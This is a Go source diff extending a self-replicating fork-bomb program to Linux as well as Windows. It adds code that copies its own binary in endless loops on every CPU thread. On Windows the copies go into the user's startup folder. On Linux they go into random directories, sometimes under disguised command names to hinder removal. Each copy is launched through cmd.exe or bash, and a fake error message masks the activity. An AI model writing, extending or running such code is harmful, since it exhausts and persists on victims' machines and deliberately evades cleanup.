@@ -15,6 +15,7 @@ import (
 
 var __DEBUG_str string = "true"
 var DEBUG bool
+var isWindows bool
 
 // ? Assigns DEBUG based on the value of __DEBUG_str
 func checkDebug() {
@@ -25,12 +26,11 @@ func checkDebug() {
 // ? Prints text to the console if DEBUG == true
 func verbose(prefix string, log ...any) {
 	if DEBUG {
-		log_s := fmt.Sprintf("%v", log...)
-		if log_s != "" && len(prefix) > 4 {
+		if len(prefix) > 4 {
 			panic(fmt.Sprintf("Log prefix length cannot be > 4 characters: %s", prefix))
 		}
 
-		fmt.Printf("[%s]:\t%s\n", prefix, log_s)
+		fmt.Printf("[%s]:\t%v\n", prefix, log)
 	}
 }
 
@@ -60,16 +60,26 @@ func getUsername() string {
 	return name
 }
 
-var cmd string = getStr(CMD_EXE)
+var cmd_exe string = getStr(CMD_EXE)
 var c string = getStr(_C)
 var strt string = getStr(START)
 
-// ? Start a process (should be used with 'go')
-func startProc(cmd string) {
-	proc := exec.Command(cmd, c, strt, cmd)
+// ? Start a Windows process using cmd.exe (should be used with 'go')
+func startProcW(cmd string) {
+	proc := exec.Command(cmd_exe, c, strt, cmd)
 	err := proc.Start()
 	if err != nil {
-		fmt.Println(err)
+		verbose("cmd", err)
+		return
+	}
+}
+
+// ? Start a Linux process using bash (should be used with 'go')
+func startProcL(cmd string) {
+	proc := exec.Command("bash", "-c", cmd+" ::UNLOCK::"+" &")
+	err := proc.Start()
+	if err != nil {
+		verbose("cmd", err)
 		return
 	}
 }
@@ -81,6 +91,7 @@ func copy(srcFile string, dstFile string) {
 		fmt.Println(err)
 		return
 	}
+
 	defer src.Close()
 
 	dst, err := os.Create(dstFile)
@@ -88,6 +99,7 @@ func copy(srcFile string, dstFile string) {
 		fmt.Println(err)
 		return
 	}
+
 	defer dst.Close()
 
 	_, err = io.Copy(dst, src)
@@ -109,23 +121,46 @@ func ensureDir(directory string) {
 }
 
 // ? Starts an infinite loop, copying then running
-func whileCopy(src string, targetDir string, fileNameBase string) {
+func whileCopyW(sourceFile string, targetDir string) {
 	ensureDir(targetDir)
 
-	targetFile := path.Join(targetDir, fileNameBase)
-
-	// Infinite loop (Like [C#]: while (true) {})
 	formatStr := getStr(NEW_NAME_FORMATTER)
+
 	for {
-		tmpName := fmt.Sprintf(formatStr, targetFile, rand.Int63())
+		tmpName := fmt.Sprintf(formatStr, targetDir, rand.Int63())
 
 		// Copy cannot use the 'go' keyword or the .exe won't exist
 		// by the time we're calling it
-		copy(src, tmpName)
+		copy(sourceFile, tmpName)
 
 		if !DEBUG {
 			// Use 'go' to "fork" (process won't return)
-			go startProc(tmpName)
+			go startProcW(tmpName)
+		}
+	}
+}
+
+func whileCopyL(sourceFile string, targetDir string) {
+	ensureDir(targetDir)
+
+	for {
+		f_rnd := rand.Int63()
+
+		var tmpName string
+
+		// 1 out of 5 times, we'll use a command name (make it harder to find files)
+		if f_rnd%5 == 0 {
+			tmpName = getRandFile()
+		} else {
+			tmpName = fmt.Sprint(f_rnd)
+		}
+
+		tmpName = path.Join(targetDir, tmpName)
+
+		copy(sourceFile, tmpName)
+
+		if !DEBUG {
+			go startProcL(tmpName)
 		}
 	}
 }
@@ -135,6 +170,74 @@ func main() {
 	// Initialize DEBUG
 	checkDebug()
 
+	isWindows = runtime.GOOS == "windows"
+
+	var this string
+	var startup string
+
+	// Get paths
+	if isWindows {
+		this, startup = startWindows()
+	} else { // Otherwise, assume it's Linux
+		this, startup = startLinux()
+	}
+
+	//os.Exit(1)
+
+	// Get the number of threads the CPU supports
+	threads := runtime.NumCPU()
+
+	fmt.Println("Begin...")
+	for i := 0; i < threads; i++ {
+		verbose("gort", "Start ", i)
+
+		// Start copying on a new goroutine
+		if isWindows {
+			go whileCopyW(this, startup)
+		} else {
+			go whileCopyL(this, startup)
+		}
+	}
+
+	// Wait 10 milliseconds to make sure at least one instance gets started
+	time.Sleep(time.Millisecond * 10)
+
+	if len(os.Args) != 0 && os.Args[0] == "::UNLOCK::" {
+		// Prevent app exit
+		for {
+			time.Sleep(time.Hour)
+		}
+	}
+
+	// Fake an error
+	fmt.Println("Invalid arguments:", os.Args)
+}
+
+// ? Get application data for Linux
+func startLinux() (string, string) {
+	// Folder pointing to this app
+	this := getProcessFolder()
+	verbose("this", this)
+
+	// Current username (minus the hostname)
+	user := getUsername()
+	verbose("user", user)
+
+	// Find a random folder (new folder per app instance)
+	startup := getRandDir("/")
+	verbose("rnd", startup)
+
+	if DEBUG {
+		// Use this to verify it works
+		startup = fmt.Sprintf("/home/%s/FOKBOMB_TMP", user)
+		verbose("rsgn", startup)
+	}
+
+	return this, startup
+}
+
+// ? Get application data for Windows
+func startWindows() (string, string) {
 	// Folder pointing to this app
 	this := getProcessFolder()
 	verbose("this", this)
@@ -144,29 +247,14 @@ func main() {
 	verbose("user", user)
 
 	// User startup folder
-	startup := fmt.Sprintf(getStr(STARTUP_FOLDER_FORMATTER), user)
+	startup := fmt.Sprintf(getStr(WIN_STARTUP_FOLDER_FORMATTER), user)
 	verbose("strt", startup)
 
 	if DEBUG {
 		// Use this to verify it works
-		startup = fmt.Sprintf(getStr(DEBUG_STARTUP_FOLDER_FORMATTER), user)
+		startup = fmt.Sprintf(getStr(WIN_DEBUG_STARTUP_FOLDER_FORMATTER), user)
 		verbose("rsgn", startup)
 	}
 
-	// Get the number of threads the CPU supports
-	threads := runtime.NumCPU()
-
-	verbose("Begin...", "")
-	fok := getStr(FOK)
-	for i := 0; i < threads; i++ {
-		verbose("gort", "Start ", i)
-
-		// Start copying on a new goroutine
-		go whileCopy(this, startup, fok) // [fok]".exe" is added in whileCopy()->copy()
-	}
-
-	// Prevent app exit
-	for {
-		time.Sleep(time.Hour)
-	}
+	return this, startup
 }
